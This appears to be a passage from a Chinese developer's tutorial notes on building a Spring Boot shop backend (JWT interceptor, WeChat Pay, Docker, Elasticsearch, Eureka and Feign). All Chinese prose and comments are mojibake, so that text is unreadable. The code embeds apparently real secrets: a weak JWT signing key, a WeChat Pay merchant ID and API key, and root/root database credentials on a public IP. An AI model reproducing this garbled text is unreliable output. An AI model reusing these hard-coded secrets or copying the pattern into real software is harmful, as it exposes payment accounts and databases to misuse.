|| &quot;&quot;.equals(token))&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125;else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // å¯†é’¥éœ€è¦ä¸åŠ å¯†æ—¶ä½¿ç”¨çš„ä¸€è‡´ try&#123; // å¦‚æœtokenæ­£ç¡® ä¸”åœ¨æœ‰æ•ˆæœŸå†… åˆ™è§£ææ­£å¸¸å¦åˆ™ä¼šå‡ºç°å¼‚å¸¸ Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // è·å–tokenä¸­çš„ç”¨æˆ·æ•°æ® String subject = body.getSubject(); // è·å–tokenä¸­å‘subject String key1 = body.get(&quot;key1&quot;, String.class); /// è·å–æ·»åŠ åœ¨mapä¸­çš„å€¼ &#125;catch(UnsupportedJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;tokenä¸åˆæ³•è¯·é‡æ–°ç™»å½•ï¼&quot;, null); &#125;catch(ExpiredJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;tokenå·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;, null); &#125; catch (Exception e)&#123; return new ResultVO(ResStatus.NO, &quot;æœªçŸ¥é”™è¯¯&quot;, null); &#125; ä½¿ç”¨æ‹¦æˆªå™¨éªŒè¯token åˆ›å»ºæ‹¦æˆªå™¨ package com.sunzy.fmmall.interceptor; import com.alibaba.fastjson.JSON; import com.sunzy.fmmall.vo.ResStatus; import com.sunzy.fmmall.vo.ResultVO; import io.jsonwebtoken.*; import org.springframework.context.annotation.Configuration; import org.springframework.stereotype.Component; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @Component public class CheckTokenInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; String token = request.getParameter(&quot;token&quot;); if (token == null || &quot;&quot;.equals(token)) &#123; doResponse(response, &quot;è¯·å…ˆç™»å½•ï¼&quot;); return false; &#125; else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // å¯†é’¥éœ€è¦ä¸åŠ å¯†æ—¶ä½¿ç”¨çš„ä¸€è‡´ try &#123; // å¦‚æœtokenæ­£ç¡® ä¸”åœ¨æœ‰æ•ˆæœŸå†… åˆ™è§£ææ­£å¸¸å¦åˆ™ä¼šå‡ºç°å¼‚å¸¸ Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // è·å–tokenä¸­çš„ç”¨æˆ·æ•°æ® String subject = body.getSubject(); // è·å–tokenä¸­å‘subject String key1 = body.get(&quot;key1&quot;, String.class); /// è·å–æ·»åŠ åœ¨mapä¸­çš„å€¼ return true; &#125; catch (UnsupportedJwtException e) &#123; doResponse(response,&quot;tokenä¸åˆæ³•ï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;); &#125; catch (ExpiredJwtException e) &#123; doResponse(response,&quot;tokenå·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;); &#125; catch (Exception e) &#123; doResponse(response,&quot;æœªçŸ¥é”™è¯¯ï¼&quot;); &#125; return false; &#125; &#125; private void doResponse(HttpServletResponse response, String msg) throws IOException &#123; ResultVO resultVO = new ResultVO(ResStatus.NO, msg, null); String string = JSON.toJSONString(resultVO); response.setContentType(&quot;application/json&quot;); response.setCharacterEncoding(&quot;utf-8&quot;); PrintWriter writer = response.getWriter(); writer.write(string); writer.flush(); writer.close(); &#125; &#125; é…ç½®æ‹¦æˆªå™¨ package com.sunzy.fmmall.config; import com.sunzy.fmmall.interceptor.CheckTokenInterceptor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; /** * æ‹¦æˆªå™¨çš„é…ç½®ç±» */ @Configuration public class InterceptorConfig implements WebMvcConfigurer &#123; @Autowired private CheckTokenInterceptor checkTokenInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) &#123; // registryæ˜¯æ‹¦æˆªå™¨çš„æ³¨å†Œå™¨ // å°†è‡ªå·±åˆ›å»ºçš„æ‹¦æˆªå™¨åŠ å…¥è¿›æ¥ å³å¯å®ç°æ‹¦æˆªåŠŸèƒ½ registry.addInterceptor(checkTokenInterceptor) .addPathPatterns(&quot;/**&quot;) // æ‹¦æˆªæ‰€æœ‰è·¯å¾„ .excludePathPatterns(&quot;/user/**&quot;); // é™¤äº†ç”¨æˆ·ç™»å½•å’Œæ³¨å†Œè·¯å¾„ &#125; &#125; 2.2 é€šè¿‡headerä¼ é€’token å‰ç«¯è®¿é—®å—é™èµ„æºæ—¶ï¼Œéƒ½å¿…é¡»æºå¸¦tokenå‘é€è¯·æ±‚ï¼Œtokenå¯ä»¥æ”¾åœ¨è¯·æ±‚è¡Œ(params)ã€è¯·æ±‚å¤´(header)ä»¥åŠè¯·æ±‚ä½“(data)ï¼Œä½†æ˜¯ä¸€èˆ¬é»˜è®¤æ”¾åœ¨è¯·æ±‚å¤´ä¸­ å‰ç«¯ä½¿ç”¨axios axios(&#123; url:url, method:&quot;get&quot;, headers:&#123; token:token &#125;, params:&#123; userId:userId &#125; &#125;) æµè§ˆå™¨çš„é¢„æ£€æœºåˆ¶ åªè¦æ˜¯å¸¦è‡ªå®šä¹‰headerçš„è·¨åŸŸè¯·æ±‚ï¼Œåœ¨å‘é€çœŸå®è¯·æ±‚å‰éƒ½ä¼šå…ˆå‘é€OPTIONSè¯·æ±‚ï¼Œæµè§ˆå™¨æ ¹æ®OPTIONSè¯·æ±‚è¿”å›çš„ç»“æœæ¥å†³å®šæ˜¯å¦ç»§ç»­å‘é€çœŸå®çš„è¯·æ±‚è¿›è¡Œè·¨åŸŸèµ„æºè®¿é—®ã€‚æ‰€ä»¥å¤æ‚è¯·æ±‚è‚¯å®šä¼šä¸¤æ¬¡è¯·æ±‚æœåŠ¡ç«¯ã€‚ å› æ­¤éœ€è¦åœ¨æ‹¦æˆªå™¨ä¸­åŠ å…¥ä»¥ä¸‹ä»£ç ï¼Œå¿…è¦å“åº”ç¬¬ä¸€æ¬¡çš„OPTIONSè¯·æ±‚åï¼Œæ‰èƒ½æ”¶åˆ°ç¬¬äºŒæ¬¡çš„GETè¯·æ±‚ã€‚ String method = request.getMethod(); System.out.println(method); if(&quot;OPTIONS&quot;.equals(method))&#123; return true; &#125; 3.é€šç”¨å®ä½“ç±»3.1 ç”¨äºå“åº”çš„å®ä½“ç±» package com.qfedu.fmmall.vo; import io.swagger.annotations.ApiModel; import io.swagger.annotations.ApiModelProperty; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import javax.annotation.Resource; @Data @NoArgsConstructor @AllArgsConstructor @ApiModel(value = &quot;ResultVOå¯¹è±¡&quot;,description = &quot;å°è£…æ¥å£è¿”å›ç»™å‰ç«¯çš„æ•°æ®&quot;) public class ResultVO &#123; //å“åº”ç»™å‰ç«¯çš„çŠ¶æ€ç  @ApiModelProperty(value = &quot;å“åº”çŠ¶æ€ç &quot;,dataType = &quot;int&quot;) private int code; //å“åº”ç»™å‰ç«¯çš„æç¤ºä¿¡æ¯ @ApiModelProperty(&quot;å“åº”æç¤ºä¿¡æ¯&quot;) private String msg; //å“åº”ç»™å‰ç«¯çš„æ•°æ® @ApiModelProperty(&quot;å“åº”æ•°æ®&quot;) private Object data; public static ResultVO success()&#123; return new ResultVO(ResStatus.OK, &quot;success&quot;, null); &#125; public static ResultVO success(String msg)&#123; return new ResultVO(ResStatus.OK, msg, null); &#125; public static ResultVO success(Object obj)&#123; return new ResultVO(ResStatus.OK, &quot;success&quot;, obj); &#125; public static ResultVO failed()&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125; public static ResultVO failed(String msg)&#123; return new ResultVO(ResStatus.NO, msg, null); &#125; &#125; 4 å¾®ä¿¡æ”¯ä»˜ é€šè¿‡å¾®ä¿¡å¹³å°ä¸ºå•†å®¶æä¾›ä»£æ”¶æ¬¾æœåŠ¡ 4.1 å•†æˆ·æ³¨å†Œå¾®ä¿¡æ”¯ä»˜ä¸šåŠ¡ å•†æˆ·ç¼–å·ï¼š1497984412 å•†æˆ·è´¦å·AppIDï¼šwx632c8f211f8122c6 å•†æˆ·Keyï¼šsbNCm1JnevqI36LrEaxFwcaT0hkGxFnC 4.2 å•†æˆ·å‘å¾®ä¿¡ç”³è¯·æ”¯ä»˜è®¢å•ï¼Œå³æ”¯ä»˜çŸ­é“¾æ¥ å¯¼å…¥å¾®ä¿¡æ”¯ä»˜çš„ä¾èµ– &lt;dependency&gt; &lt;groupId&gt;com.github.wxpay&lt;/groupId&gt; &lt;artifactId&gt;wxpay-sdk&lt;/artifactId&gt; &lt;version&gt;0.0.3&lt;/version&gt; &lt;/dependency&gt; åˆ›å»ºWXPayConfigï¼Œé‡å†™é‡Œé¢çš„æ–¹æ³•ï¼Œè®¾ç½®è‡ªå·±çš„AppIDï¼Œå•†æˆ·idï¼Œå¯†é’¥ï¼Œ public class MyPayConfig implements WXPayConfig &#123; @Override public String getAppID() &#123; return &quot;wx632c8f211f8122c6&quot;; &#125; @Override public String getMchID() &#123; return &quot;1497984412&quot;; &#125; @Override public String getKey() &#123; return &quot;sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC&quot;; &#125; @Override public InputStream getCertStream() &#123; return null; &#125; @Override public int getHttpConnectTimeoutMs() &#123; return 0; &#125; @Override public int getHttpReadTimeoutMs() &#123; return 0; &#125; &#125; è®¾ç½®â½€ä»˜è®¢å•çš„å‚æ•° HashMap&lt;String,String&gt; data = new HashMap&lt;&gt;(); data.put(&quot;body&quot;,&quot;å’ªå’ªè§æ¡&quot;); //å•†å“æè¿° data.put(&quot;out_trade_no&quot;,orderId); //ä½¿â½¤å½“å‰â½¤æˆ·è®¢å•çš„ç¼–å·ä½œä¸ºå½“å‰â½€ä»˜äº¤æ˜“çš„ äº¤æ˜“å· data.put(&quot;fee_type&quot;,&quot;CNY&quot;); //â½€ä»˜å¸ç§ data.put(&quot;total_fee&quot;,&quot;1&quot;); //â½€ä»˜â¾¦é¢ data.put(&quot;trade_type&quot;,&quot;NATIVE&quot;); //äº¤æ˜“ç±»å‹ data.put(&quot;notify_url&quot;,&quot;/pay/success&quot;); //è®¾ç½®â½€ä»˜å®Œæˆæ—¶çš„å›è°ƒâ½…æ³• æ¥â¼ ç”³è¯·æ”¯ä»˜è¿æ¥ WXPay wxPay = new WXPay(new MyPayConfig()); Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); //å‘é€è¯·æ±‚ orderInfo.put(&quot;payUrl&quot;,resp.get(&quot;code_url&quot;)); 5 Ngrokå®ç°å†…ç½‘ç©¿é€ æ³¨å†ŒNgrokåè¿›è¡Œå®åè®¤è¯ å¼€é€šéš§é“ è·å–éš§é“ID ä¸‹è½½ngorkå®¢æˆ·ç«¯ å¯åŠ¨å®¢æˆ·ç«¯ï¼Œè¾“å…¥å¯¹åº”çš„éš§é“IDï¼Œå³å¯å®ç°å†…ç½‘ç©¿é€ 6 quartzå®šæ—¶ä»»åŠ¡æ¡†æ¶ä½¿â½¤6.1 å¯¼å…¥ä¾èµ–&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-quartz&lt;/artifactId&gt; &lt;/dependency&gt; 6.2 åˆ›å»ºå®šæ—¶ä»»åŠ¡@Component public class PrintHelloWorldJob &#123; //https://cron.qqe2.com @Scheduled(cron = &quot;0/3 * * * * ?&quot;) public void printHelloWorld()&#123; System.out.println(&quot;----hello world.&quot;); &#125; &#125; 6.3 åœ¨å¯åŠ¨ç±»æ·»åŠ æ³¨è§£ä»¥å¼€å¯å®šæ—¶ä»»åŠ¡@SpringBootApplication @EnableScheduling public class QuartzDemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(QuartzDemoApplication.class, args); &#125; &#125; å½“æ§åˆ¶å°æ‰“å°å‡ºè¿™æ®µæ—¥å¿—æ—¶ï¼Œè¯´æ˜å®šæ—¶ä»»åŠ¡åˆ›å»ºæˆåŠŸ 7 åç«¯é¡¹ç›®éƒ¨ç½²ä½¿ç”¨dockeréƒ¨ç½²é¡¹ç›® Dockerfile FROM java:8-alpine COPY ./app.jar /tmp/app.jar EXPOSE 8080 ENTRYPOINT java -jar /tmp/app.jar é¡¹ç›®æ‰“åŒ… å°†jaråŒ…æ”¾åˆ°ä¸dockerfileåŒä¸€ç›®å½•ä¸‹ ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸­æ„å»ºé•œåƒ è¿›å…¥åˆ°Dockerfileæ‰€åœ¨çš„ç›®å½•ä¸‹ï¼Œè¿è¡Œä»¥ä¸‹å‘½ä»¤ docker build -t fmmall . åˆ›å»ºå®¹å™¨ docker run --name fmmall -p 8080:8080 -d fmmall åˆ†å¸ƒå¼ä½¿ç”¨watch dogæœºåˆ¶ç›‘è§†redisä¸­keyçš„è¿‡æœŸæ—¶é—´ çœ‹é—¨ç‹—çº¿ç¨‹ï¼šç”¨äºç»™å½“å‰çš„keyå»¶é•¿è¿‡æœŸæ—¶é—´ï¼Œä¿è¯ä¸šåŠ¡çº¿ç¨‹æ­£å¸¸æ‰§è¡Œè¿‡ç¨‹ï¼Œé”ä¸ä¼šè¿‡æœŸ åˆ†å¸ƒå¼é”æ¡†æ¶-redisson åŸºäºredis+çœ‹é—¨ç‹—å®ç°çš„åˆ†å¸ƒå¼é”æ¡†æ¶ ESspringbootæ•´åˆES å¯¼å…¥ä¾èµ– &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-elasticsearch&lt;/artifactId&gt; &lt;/dependency&gt; é…ç½®ä¿¡æ¯ spring: elasticsearch: rest: uris: http://192.168.238.132:9200 å°†æ•°æ®åº“ä¸­çš„ä¿¡æ¯å¯¼å…¥åˆ°ESä¸­ å¦‚æœå•†å“è¡¨ä¸­æ²¡æœ‰æ•°æ®ï¼Œåˆ™åœ¨å¹³å°ç®¡ç†ç³»ç»Ÿä¸­çš„å•†å“æ·»åŠ åŠŸèƒ½ä¸­ï¼Œå½“å•†å®¶å‘å•†å“è¡¨æ·»åŠ å¹¶ä¸Šæ¶ä¸€ä¸ªå•†å“æ—¶åŒæ­¥å‘ESæ·»åŠ ä¸€ä¸ªå•†å“;å•†å®¶ä¸‹æ¶ä¸€ä¸ªå•†å“å°±ä»ESä¸­åˆ é™¤ä¸€ä¸ªå•†å“ã€‚ç³»ç»Ÿè¿è¡Œå‰æœŸæ•°æ®é‡å°æ²¡æœ‰ä½¿ç”¨ESï¼Œå½“æ•°æ®é‡å¢é•¿ä¹‹åä½¿ç”¨ESæ—¶ï¼Œéœ€è¦å°†æ•°æ®åº“ç°æœ‰çš„æ•°æ®å¯¼å…¥åˆ°ES(å¯¼å…¥å·¥ä½œéœ€è¦åœ¨é¡¹ç›®éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒä¹‹å‰æ¥å®Œæˆ) // 1.æŸ¥è¯¢æ•°æ®åº“è·å–åˆ°æ‰€æœ‰æ•°æ® List&lt;ProductVO&gt; productVOS = productMapper.selectProducts(); int size = productVOS.size(); // return ResultVO.success(size); // 2. éå†æ•°æ®å°†æ•°æ®å†™å…¥åˆ°ESä¸­ this.client =new RestHighLevelClient(RestClient.builder( HttpHost.create(&quot;http://192.168.238.132:9200&quot;) )); for (int i = 0; i &lt; productVOS.size(); i++) &#123; ProductVO productVO = productVOS.get(i); String productId = productVO.getProductId(); String productName = productVO.getProductName(); Integer soldNum = productVO.getSoldNum(); List&lt;ProductSku&gt; skus = productVO.getSkus(); String skuImg = skus.size() == 0? &quot;&quot;: productVO.getSkus().get(0).getSkuImg(); String skuName = skus.size() == 0? &quot;&quot;: productVO.getSkus().get(0).getSkuName(); Integer sellPrice = skus.size() == 0? 0: productVO.getSkus().get(0).getSellPrice(); Product4ES product4ES = new Product4ES(productId, productName, skuImg, soldNum, skuName, sellPrice); IndexRequest request = new IndexRequest(&quot;fmmallproductindex&quot;); request.id(productId).source(JSON.toJSONString(product4ES), XContentType.JSON); IndexResponse index = this.client.index(request, RequestOptions.DEFAULT); System.out.println(&quot;------ i &quot; + i + &quot;-----&quot; + index); &#125; this.client.close(); ä½¿ç”¨ESè¿›è¡Œè¿›è¡Œå…¨æ–‡æœç´¢ /*ä»ESä¸­æŸ¥è¯¢ä¿¡æ¯*/ this.client =new RestHighLevelClient(RestClient.builder( HttpHost.create(&quot;http://192.168.238.132:9200&quot;) )); int start = (pageNum-1)*limit; SearchRequest request = new SearchRequest(&quot;fmmallproductindex&quot;); SearchSourceBuilder sourceBuilder = new SearchSourceBuilder(); sourceBuilder.query(QueryBuilders.multiMatchQuery(kw, &quot;productName&quot;, &quot;pruductSkuName&quot;)); // åˆ†é¡µæ¡ä»¶ sourceBuilder.from(start); sourceBuilder.size(limit); // é«˜äº®æ˜¾ç¤º HighlightBuilder highlightBuilder = new HighlightBuilder(); HighlightBuilder.Field productName = new HighlightBuilder.Field(&quot;productName&quot;); HighlightBuilder.Field pruductSkuName = new HighlightBuilder.Field(&quot;pruductSkuName&quot;); highlightBuilder.field(productName); highlightBuilder.field(pruductSkuName); highlightBuilder.preTags(&quot;&lt;label style=&#x27;color:red&#x27;&gt;&quot;); highlightBuilder.postTags(&quot;&lt;label&gt;&quot;); sourceBuilder.highlighter(highlightBuilder); request.source(sourceBuilder); SearchResponse searchResponse = null; try &#123; searchResponse = this.client.search(request, RequestOptions.DEFAULT); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; // å¤„ç†å“åº”ç»“æœ SearchHits hits = searchResponse.getHits(); TotalHits totalHits = hits.getTotalHits(); int count = (int) totalHits.value; // æŸ¥è¯¢åˆ°çš„è®°å½•æ€»æ•° int pageCount = (count%limit==0? count/limit:count/limit+1); Iterator&lt;SearchHit&gt; iterator = hits.iterator(); List&lt;Product4ES&gt; product4ESList = new ArrayList&lt;&gt;(); while(iterator.hasNext())&#123; SearchHit nextHit = iterator.next(); String sourceAsString = nextHit.getSourceAsString(); Product4ES product4ES = JSON.parseObject(sourceAsString, Product4ES.class); // è·å–é«˜äº®å­—æ®µ Map&lt;String, HighlightField&gt; highlightFields = nextHit.getHighlightFields(); HighlightField highLightProductName = highlightFields.get(&quot;productName&quot;); if(highLightProductName != null)&#123; String string = Arrays.toString(highLightProductName.fragments()); product4ES.setProductName(string); &#125; product4ESList.add(product4ES); &#125; PageHelper&lt;Product4ES&gt; pageHelper = new PageHelper&lt;&gt;(count, pageCount, product4ESList); ResultVO resultVO = new ResultVO(ResStatus.OK, &quot;SUCCESS&quot;, pageHelper); return resultVO; æ­å»ºæœåŠ¡å‘ç°å’Œæ³¨å†Œä¸­å¿ƒEureka æ·»åŠ å…³äºeruekaç›¸å…³é…ç½®ä¿¡æ¯ eureka: client: service-url: defaultZone: http://127.0.0.1:8761/eureka register-with-eureka: false fetch-registry: false server: port: 8761 spring: application: name: eureka-server åœ¨é¡¹ç›®çš„å¯åŠ¨ç±»ä¸­æ·»åŠ æ³¨é‡Š@EnableEurekaServer package com.qfedu.eureka.server; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.netflix.eureka.server.EnableEurekaServer; @SpringBootApplication @EnableEurekaServer public class EurekaServerApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(EurekaServerApplication.class, args); &#125; &#125; é…ç½®securityä¿¡æ¯ spring: application: name: eureka-server security: user: name: sunzy password: 111111 é…ç½®springsecuity ``` ### æ‹†åˆ†ç”¨æˆ·ç™»å½•æ¨¡å— - é¦–å…ˆåˆ›å»ºæ–°çš„æ¨¡å— api-user-login - å¯¼å…¥ä¾èµ– ```xml &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; é…ç½®application.yml server: port: 8001 eureka: client: service-url: defualtZone: http://sunzy:111111@127.0.0.1:8761/eureka spring: application: name: api-user-login åœ¨å¯åŠ¨ç±»æ·»åŠ æ³¨è§£@EnableDiscoveryClientå’Œ@EnableFeignClients package com.qfedu.api; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.cloud.openfeign.EnableFeignClients; @SpringBootApplication @EnableDiscoveryClient @EnableFeignClients public class ApiUserLoginApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(ApiUserLoginApplication.class, args); &#125; &#125; æ·»åŠ æ³¨è§£åæ—¢å¯å¯åŠ¨æœåŠ¡ï¼Œåœ¨æ³¨å†Œä¸­å¿ƒä¸­å¯ä»¥çœ‹åˆ°æ³¨å†ŒæˆåŠŸçš„æœåŠ¡ ç”¨æˆ·æŸ¥è¯¢æ¨¡å— è¯¥æ¨¡å—çš„ä¸»è¦çš„ä½œç”¨æ˜¯ä¸ºç™»å½•æä¾›ç”¨æˆ·æŸ¥è¯¢åŠŸèƒ½ï¼Œå› æ­¤æ¶‰åŠåˆ°æœåŠ¡è°ƒç”¨ é¦–å…ˆåˆ›å»ºæ¨¡å—user-check pomæ–‡ä»¶å†…å®¹ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.2&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;user-check&lt;/artifactId&gt; &lt;version&gt;2.1.1&lt;/version&gt; &lt;name&gt;user-check&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;spring-cloud.version&gt;2021.0.3&lt;/spring-cloud.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;common&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.4.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;$&#123;spring-cloud.version&#125;&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; application.yaml server: port: 9001 spring: application: name: user-check datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://81.68.252.36:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false username: root password: root mybatis-plus: global-config: db-config: # table-prefix: tbl_ id-type: auto configuration: # è®¾ç½®mybatisplusçš„æ—¥å¿—ä¸ºæ ‡å‡†è¾“å…¥æ ¼å¼ å¯ä»¥æ˜¾ç¤ºæ‰§è¡Œçš„sqlè¯­å¥ã€æºå¸¦çš„å‚æ•°ä¸æŸ¥è¯¢ç»“æœ log-impl: org.apache.ibatis.logging.stdout.StdOutImpl eureka: client: service-url: defaultZone: http://sunzy:111111@127.0.0.1:8761/eureka åœ¨å¯åŠ¨ç±»ä¸­æ·»åŠ æ³¨é‡Š@EnableDiscoveryClient serviceå’Œdaoå±‚ä»£ç ä¸ä¹‹å‰å†™å†…å®¹åŸºæœ¬ä¸€è‡´ åœ¨api-user-loginæ¨¡å—ä¸­è°ƒç”¨user-check åˆ›å»ºUserCheckClient @FeignClient(value = &quot;user-check&quot;) public interface UserCheckClient &#123; @GetMapping(&quot;user/check&quot;) public Users userCheck(@RequestParam(&quot;username&quot;) String username,@RequestParam(&quot;password&quot;) String password); &#125; å…¶ä¸­@FeignClient(value = &quot;user-check&quot;)ä¸­çš„valueè¦ä¸æ³¨å†Œåˆ°eurekaä¸­æœåŠ¡åç›¸åŒï¼Œ@GetMapping(&quot;user/check&quot;)è¦ä¸user-checkçš„controllerä¸­çš„è®¿é—®è·¯å¾„ç›¸åŒã€‚ æ–¹æ³•åä¹Ÿè¦ä¸controllerä¸­çš„æ–¹æ³•ç›¸åŒã€‚å¹¶ä¸”åœ¨æœ‰å¤šä¸ªå‚æ•°çš„æƒ…å†µä¸‹éœ€è¦åœ¨æ¯ä¸ªå‚æ•°å‰åŠ ä¸Š@RequestParam(&quot;username&quot;)ï¼Œå¦åˆ™feginè°ƒç”¨æ—¶ï¼Œä¼šå°†æ‰€æœ‰çš„å‚æ•°å½“æˆpostæ–¹å¼çš„è¯·æ±‚ä½“ï¼Œä»è€ŒæŠ¥é”™ã€‚ public Users userCheck(@RequestParam(&quot;username&quot;) String username,@RequestParam(&quot;password&quot;) String password); api-user-loginåœ¨serviceä¸­è¿›è¡ŒæœåŠ¡è°ƒç”¨å³å¯ package com.qfedu.api.service.impl; import com.qfedu.api.service.UserService; import com.qfedu.api.service.fegin.UserCheckClient; import com.qfedu.fmmall.beans.Users; import com.qfedu.fmmall.vo.ResultVO; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Qualifier; import org.springframework.stereotype.Service; @Service public class UserServiceImpl implements UserService &#123; @Qualifier(&quot;com.qfedu.api.service.fegin.UserCheckClient&quot;) @Autowired private UserCheckClient userCheckClient; @Override public ResultVO checkLogin(String username, String password) &#123; // è°ƒç”¨å¦å¤–ä¸€ä¸ªæœåŠ¡ä»æ•°æ®åº“ä¸­æŸ¥è¯¢åˆ°ç”¨æˆ·ä¿¡æ¯ Users users = userCheckClient.userCheck(username, password); if(users == null) &#123; return ResultVO.failed(&quot;å¯†ç é”™è¯¯ï¼&quot;); &#125;else if (&quot;null&quot;.equals(users.getNickname()))&#123; return ResultVO.failed(&quot;ç”¨æˆ·åä¸å­˜åœ¨ï¼&quot;); &#125;else &#123; return ResultVO.success(users); &#125; &#125; &#125; æ­å»ºgateway åˆ›å»ºgatewayæœåŠ¡æ¨¡å— pomæ–‡ä»¶å†…å®¹ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; 